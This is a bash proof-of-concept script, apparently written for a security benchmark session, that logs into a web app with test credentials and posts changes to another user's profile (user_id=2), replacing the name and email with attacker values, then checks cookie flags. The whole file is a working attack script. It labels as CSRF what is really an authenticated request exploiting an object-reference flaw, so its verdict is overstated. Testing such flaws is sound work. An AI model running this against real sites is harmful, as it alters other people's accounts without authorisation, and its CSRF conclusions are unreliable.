#!/bin/bash
# POC: Bash script that tests for CSRF vulnerability by attempting to modify user profiles without CSRF tokens. Authenticates, retrieves a profile, checks for token presence, attempts modification, and verifies success.
# Target: ./repo
# Created: 2025-12-01T16:24:05.131Z
# Session: benchmark-XBEN-104-24-minci3mm

# CSRF Attack POC - Profile Modification Without Token
# This script demonstrates that the /profile endpoint lacks CSRF token validation

TARGET="${1:-http://localhost:5000}"
COOKIE_JAR="/tmp/csrf_test_cookies_$$.txt"

echo "=========================================="
echo "CSRF Vulnerability PoC - /profile Endpoint"
echo "=========================================="
echo "Target: $TARGET"
echo ""

# Helper function for cleanup
cleanup() {
  rm -f "$COOKIE_JAR"
}
trap cleanup EXIT

# Step 1: Authenticate and get session cookie
echo "[*] Authenticating with test/test credentials..."
AUTH=$(curl -s -c "$COOKIE_JAR" -X POST "$TARGET/login" \
  -d "username=test&password=test" -L 2>/dev/null)

if [ ! -f "$COOKIE_JAR" ]; then
  echo "[-] Failed to establish session"
  exit 1
fi

echo "[+] Session established"
SESSION_ID=$(grep -o "session=[^;]*" "$COOKIE_JAR" | cut -d= -f2)
echo "[+] Session ID: ${SESSION_ID:0:10}..."

# Step 2: Get initial profile state
echo ""
echo "[*] Retrieving current profile for user_id=2..."
INITIAL=$(curl -s -b "$COOKIE_JAR" "$TARGET/profile?user_id=2" 2>/dev/null)
INITIAL_NAME=$(echo "$INITIAL" | grep -o 'name"[^}]*' | head -1)
echo "[+] Initial profile: $INITIAL_NAME"

# Step 3: Check for CSRF protection
echo ""
echo "[*] Checking for CSRF token in profile form..."
if echo "$INITIAL" | grep -qi "csrf\|_token\|authenticity"; then
  echo "[-] CSRF token appears to be present"
  exit 1
else
  echo "[+] No CSRF token found in profile response"
fi

# Step 4: Attempt profile modification without CSRF token
echo ""
echo "[*] Attempting to modify profile WITHOUT CSRF token..."
echo "[*] Target URL: $TARGET/profile?user_id=2"
echo "[*] Modifying: name=CSRF_HACKED, email=attacker@csrf.com"

ATTACK=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET/profile?user_id=2" \
  -d "name=CSRF_HACKED&email=attacker@csrf.com&phone=555-CSRF" 2>/dev/null)

# Check if attack was successful
if echo "$ATTACK" | grep -qi "success\|redirect\|updated"; then
  echo "[+] POST request accepted without CSRF token"
  echo "[+] Server response indicates successful modification"
  EXPLOIT_SUCCESS=1
fi

# Step 5: Verify the modification
echo ""
echo "[*] Verifying profile modification..."
VERIFY=$(curl -s -b "$COOKIE_JAR" "$TARGET/profile?user_id=2" 2>/dev/null)

if echo "$VERIFY" | grep -q "CSRF_HACKED"; then
  echo "[!!!] SUCCESS: Profile was modified without CSRF token!"
  echo "[!!!] Name changed to: CSRF_HACKED"
  VULNERABILITY_CONFIRMED=1
fi

if echo "$VERIFY" | grep -q "attacker@csrf.com"; then
  echo "[!!!] SUCCESS: Email was changed to attacker@csrf.com without CSRF token!"
  VULNERABILITY_CONFIRMED=1
fi

if [ -z "$VULNERABILITY_CONFIRMED" ] && [ -n "$EXPLOIT_SUCCESS" ]; then
  echo "[+] Modification request was accepted (no error/rejection)"
  echo "[+] CSRF protection is NOT enforced"
fi

# Step 6: Check response headers for CSRF/SameSite
echo ""
echo "[*] Checking HTTP headers for CSRF/security flags..."
HEADERS=$(curl -s -i -b "$COOKIE_JAR" "$TARGET/profile?user_id=1" 2>/dev/null | head -20)

if echo "$HEADERS" | grep -q "SameSite"; then
  echo "[-] SameSite flag is set"
else
  echo "[+] No SameSite flag on cookies"
fi

if echo "$HEADERS" | grep -q "Secure"; then
  echo "[*] Secure flag found"
else
  echo "[+] No Secure flag on cookies"
fi

echo ""
echo "=========================================="
echo "CSRF Vulnerability Assessment Complete"
echo "=========================================="
if [ -n "$VULNERABILITY_CONFIRMED" ]; then
  echo "[!!!] VULNERABLE: CSRF protection is NOT implemented"
  echo "[!!!] Profiles can be modified without CSRF tokens"
  echo "[!!!] Combined with IDOR, full compromise is possible"
  exit 0
else
  echo "[+] CSRF test completed"
  echo "[+] Check manual verification steps above"
  exit 0
fi